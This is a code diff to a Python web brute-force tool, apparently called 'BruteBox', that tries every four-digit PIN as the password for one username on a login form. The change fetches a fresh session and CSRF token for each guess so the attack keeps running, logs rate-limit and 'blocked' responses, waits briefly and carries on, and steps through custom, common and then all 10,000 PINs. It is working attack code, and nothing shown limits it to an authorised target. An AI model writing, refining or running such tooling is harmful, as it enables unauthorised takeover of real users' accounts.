@@ -23,18 +23,13 @@ class WebBruteForcer:
         self.custom_pins = custom_pins or []
         self.found = False
         self.attempts = 0
-        self.skipped = 0
         self.start_time = time.time()
-        self.session_pool = []
-        self.pool_lock = threading.Lock()
-        self.attempts_lock = threading.Lock()
-        self.csrf_lock = threading.Lock()
         self.rate_limit_hits = 0
         self.block_hits = 0
         self.csrf_rotations = 0
         self.response_times = []
         self.last_csrf = None
-        self.attempts_since_refresh = 0
+        self.csrf_lock = threading.Lock()
 
     def emit_progress(self, event, data):
         socketio.emit(event, data, room=self.sid)
@@ -45,7 +40,6 @@ class WebBruteForcer:
 
     def _extract_csrf(self, html):
         try:
-            from bs4 import BeautifulSoup
             soup = BeautifulSoup(html, "html.parser")
             el = soup.find("input", {"name": "_token"})
             if el:
@@ -54,82 +48,21 @@ class WebBruteForcer:
             pass
         return None
 
-    def _new_session(self):
+    def _fresh_session(self):
+        """Get a brand new session with fresh CSRF token every single call."""
         try:
             session = requests.Session()
-            resp = session.get(self.url, timeout=5)
+            resp = session.get(self.url, timeout=8)
             token = self._extract_csrf(resp.text)
             if token:
                 with self.csrf_lock:
                     if self.last_csrf and self.last_csrf != token:
                         self.csrf_rotations += 1
                     self.last_csrf = token
-                return {
-                    'session': session,
-                    'csrf_token': token,
-                    'last_used': time.time()
-                }
+                return session, token
         except Exception:
             pass
-        return None
-
-    def _refresh_all_sessions(self):
-        """
-        FIX: Sequential refresh -- no ThreadPoolExecutor inside
-        to prevent deadlock on low CPU environments like Render 0.1 CPU.
-        """
-        self.emit_progress('log', {
-            'message': '[CSRF] Proactive token refresh triggered',
-            'type': 'warn'
-        })
-
-        with self.pool_lock:
-            self.session_pool.clear()
-
-        # Sequential rebuild -- safe on 0.1 CPU
-        new_sessions = []
-        for _ in range(6):
-            if self.stop_event.is_set():
-                break
-            s = self._new_session()
-            if s:
-                new_sessions.append(s)
-
-        with self.pool_lock:
-            self.session_pool.extend(new_sessions)
-
-        self.emit_progress('log', {
-            'message': f'[CSRF] Pool refreshed -- {len(new_sessions)} fresh sessions ready',
-            'type': 'info'
-        })
-
-    def create_session_pool(self, size=6):
-        """
-        FIX: Sequential pool creation -- no ThreadPoolExecutor
-        to prevent deadlock on low CPU environments.
-        """
-        self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
-        for _ in range(size):
-            if self.stop_event.is_set():
-                return False
-            s = self._new_session()
-            if s:
-                self.session_pool.append(s)
-        self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
-        return len(self.session_pool) > 0
-
-    def get_session_from_pool(self):
-        with self.pool_lock:
-            if self.session_pool:
-                session_data = self.session_pool.pop(0)
-                session_data['last_used'] = time.time()
-                return session_data
-        return self._new_session()
-
-    def return_session_to_pool(self, session_data):
-        if session_data:
-            with self.pool_lock:
-                self.session_pool.append(session_data)
+        return None, None
 
     def get_security_rating(self):
         score = 0
@@ -178,116 +111,77 @@ class WebBruteForcer:
 
         mpin_str = str(mpin).zfill(4)
 
-        # Proactive CSRF refresh every 50 attempts
-        with self.attempts_lock:
-            self.attempts_since_refresh += 1
-            do_refresh = self.attempts_since_refresh >= 50
-            if do_refresh:
-                self.attempts_since_refresh = 0
-
-        if do_refresh:
-            self._refresh_all_sessions()
-
-        # Get session with retries
-        session_data = None
+        # Fresh session every PIN -- guarantees valid CSRF every time
+        # Retry up to 3 times if session fetch fails
+        session, token = None, None
         for _ in range(3):
-            session_data = self.get_session_from_pool()
-            if session_data:
+            session, token = self._fresh_session()
+            if session and token:
                 break
-            time.sleep(0.3)
+            time.sleep(0.5)
 
-        if not session_data:
-            with self.attempts_lock:
-                self.skipped += 1
-            self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
+        if not session or not token:
+            self.emit_progress('log', {
+                'message': f'[WARN] Could not get session for PIN {mpin_str} -- skipping',
+                'type': 'warn'
+            })
             return None
 
-        MAX_PIN_RETRIES = 2
-        for pin_attempt in range(MAX_PIN_RETRIES):
-            if self.found or self.stop_event.is_set():
-                break
+        try:
+            post_data = {
+                "username": self.username,
+                "password": mpin_str,
+                "_token": token
+            }
+
+            t_start = time.time()
+            response = session.post(self.url, data=post_data, timeout=8)
+            elapsed_req = time.time() - t_start
+            self.response_times.append(elapsed_req)
+
+            self.attempts += 1
+
+            if self.attempts % 10 == 0:
+                elapsed = time.time() - self.start_time
+                self.emit_progress('progress', {
+                    'attempts': self.attempts,
+                    'current': mpin_str,
+                    'elapsed': round(elapsed, 1),
+                    'speed': round(self.attempts / elapsed, 2) if elapsed > 0 else 0
+                })
 
             try:
-                post_data = {
-                    "username": self.username,
-                    "password": mpin_str,
-                    "_token": session_data['csrf_token']
-                }
-
-                t_start = time.time()
-                response = session_data['session'].post(
-                    self.url, data=post_data, timeout=5
-                )
-                elapsed_req = time.time() - t_start
-                self.response_times.append(elapsed_req)
-
-                with self.attempts_lock:
-                    self.attempts += 1
-                    current_attempts = self.attempts
-
-                if current_attempts % 10 == 0:
-                    elapsed = time.time() - self.start_time
-                    self.emit_progress('progress', {
-                        'attempts': current_attempts,
-                        'current': mpin_str,
-                        'elapsed': round(elapsed, 1),
-                        'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
-                    })
-
-                if response.status_code == 419:
+                json_response = response.json()
+                if json_response.get("signal") == "success":
+                    self.found = True
+                    return mpin_str
+                elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
+                    self.block_hits += 1
                     self.emit_progress('log', {
-                        'message': f'[CSRF] 419 on {mpin_str} -- fresh session retry',
+                        'message': f'[BLOCK] Defense triggered: {json_response}',
                         'type': 'warn'
                     })
-                    self.csrf_rotations += 1
-                    session_data = self._new_session()
-                    if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
-                        continue
-                    else:
-                        break
-
-                try:
-                    json_response = response.json()
-                    if json_response.get("signal") == "success":
-                        self.found = True
-                        return mpin_str
-                    elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
-                        self.block_hits += 1
-                        self.emit_progress('log', {
-                            'message': f'[BLOCK] Defense triggered: {json_response}',
-                            'type': 'warn'
-                        })
-                        session_data = None
-                        time.sleep(2)
-                        break
-                    else:
-                        break
-
-                except Exception:
-                    if response.status_code == 302:
-                        self.found = True
-                        return mpin_str
-                    elif response.status_code == 429:
-                        self.rate_limit_hits += 1
-                        self.emit_progress('log', {
-                            'message': '[RATE] Rate limit -- throttling...',
-                            'type': 'warn'
-                        })
-                        session_data = None
-                        time.sleep(3)
-                        break
-                    else:
-                        session_data = self._new_session()
-                        if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
-                            continue
-                        break
-
+                    time.sleep(2)
             except Exception:
-                session_data = None
-                break
+                if response.status_code == 302:
+                    self.found = True
+                    return mpin_str
+                elif response.status_code == 419:
+                    self.csrf_rotations += 1
+                    self.emit_progress('log', {
+                        'message': f'[CSRF] 419 on {mpin_str}',
+                        'type': 'warn'
+                    })
+                elif response.status_code == 429:
+                    self.rate_limit_hits += 1
+                    self.emit_progress('log', {
+                        'message': '[RATE] Rate limit -- throttling...',
+                        'type': 'warn'
+                    })
+                    time.sleep(3)
 
-        if session_data and not self.found and not self.stop_event.is_set():
-            self.return_session_to_pool(session_data)
+        except Exception:
+            pass
 
         return None
 
@@ -299,11 +193,8 @@ class WebBruteForcer:
             1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
         ]
 
-        if not self.create_session_pool(6):
-            self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
-            return
-
         self.emit_progress('log', {'message': '[INIT] BruteBox engine online', 'type': 'info'})
+        self.emit_progress('log', {'message': '[INFO] Fresh session mode -- guaranteed CSRF validity', 'type': 'info'})
 
         # Phase 1: Custom wordlist
         if self.custom_pins:
@@ -345,11 +236,10 @@ class WebBruteForcer:
 
         self.emit_progress('log', {'message': '[SCAN] Dictionary exhausted. Switching to full keyspace...', 'type': 'info'})
 
-        # Phase 3: Full range -- fully sequential, no ThreadPoolExecutor
+        # Phase 3: Full range -- fully sequential, fresh session per PIN
         tested = set(common_pins) | set(self.custom_pins)
         all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
-        chunk_size = 50
-        chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]
+        chunks = [all_mpins[i:i+100] for i in range(0, len(all_mpins), 100)]
 
         for chunk_idx, chunk in enumerate(chunks):
             if self.stop_event.is_set() or self.found:
